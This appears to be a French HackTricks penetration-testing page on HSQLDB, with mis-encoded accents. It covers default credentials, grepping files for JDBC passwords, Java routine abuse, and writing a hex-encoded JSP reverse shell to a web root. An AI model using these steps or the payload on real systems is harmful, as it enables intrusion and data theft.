<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>


# Informations de base

**HSQLDB \([HyperSQL DataBase](http://hsqldb.org/)\)** est le principal syst√®me de base de donn√©es relationnelle SQL √©crit en Java. Il offre un moteur de base de donn√©es petit, rapide, multithread et transactionnel avec des tables en m√©moire et sur disque, et prend en charge les modes embarqu√© et serveur.

**Port par d√©faut :** 9001
```text
9001/tcp open  jdbc      HSQLDB JDBC (Network Compatibility Version 2.3.4.0)
```
# Information

### Param√®tres par d√©faut

Notez que par d√©faut, ce service fonctionne probablement en m√©moire ou est li√© √† localhost. Si vous l'avez trouv√©, vous avez probablement exploit√© un autre service et cherchez √† escalader les privil√®ges.

Les identifiants par d√©faut sont g√©n√©ralement `sa` avec un mot de passe vide.

Si vous avez exploit√© un autre service, recherchez des identifiants possibles en utilisant
```text
grep -rP 'jdbc:hsqldb.*password.*' /path/to/search
```
Notez soigneusement le nom de la base de donn√©es - vous en aurez besoin pour vous connecter.

# Collecte d'informations

Connectez-vous √† l'instance de la base de donn√©es en [t√©l√©chargeant HSQLDB](https://sourceforge.net/projects/hsqldb/files/) et en extrayant `hsqldb/lib/hsqldb.jar`. Ex√©cutez l'application GUI \(beurk\) en utilisant `java -jar hsqldb.jar` et connectez-vous √† l'instance en utilisant les identifiants d√©couverts/faibles.

Notez que l'URL de connexion ressemblera √† ceci pour un syst√®me distant : `jdbc:hsqldb:hsql://ip/DBNAME`.

# Astuces

## Routinnes de langage Java

Nous pouvons appeler des m√©thodes statiques d'une classe Java depuis HSQLDB en utilisant des Routinnes de Langage Java. Notez que la classe appel√©e doit √™tre dans le chemin de classe de l'application.

Les JRT peuvent √™tre des `fonctions` ou des `proc√©dures`. Les fonctions peuvent √™tre appel√©es via des instructions SQL si la m√©thode Java renvoie une ou plusieurs variables primitives compatibles avec SQL. Elles sont invoqu√©es en utilisant l'instruction `VALUES`.

Si la m√©thode Java que nous voulons appeler renvoie void, nous devons utiliser une proc√©dure invoqu√©e avec l'instruction `CALL`.

## Lecture des propri√©t√©s syst√®me Java

Cr√©er une fonction :
```text
CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
```
Ex√©cuter la fonction :
```text
VALUES(getsystemproperty('user.name'))
```
Vous pouvez trouver une [liste des propri√©t√©s syst√®me ici](https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html).

## √âcrire du Contenu dans un Fichier

Vous pouvez utiliser le gadget Java `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename` situ√© dans le JDK \(charg√© automatiquement dans le chemin de classe de l'application\) pour √©crire des √©l√©ments encod√©s en hexad√©cimal sur le disque via une proc√©dure personnalis√©e. **Notez la taille maximale de 1024 octets**.

Cr√©er une proc√©dure :
```text
CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
```
Ex√©cuter la proc√©dure :
```text
call writetofile('/path/ROOT/shell.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3131392[...]' AS VARBINARY(1024)))
```
<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
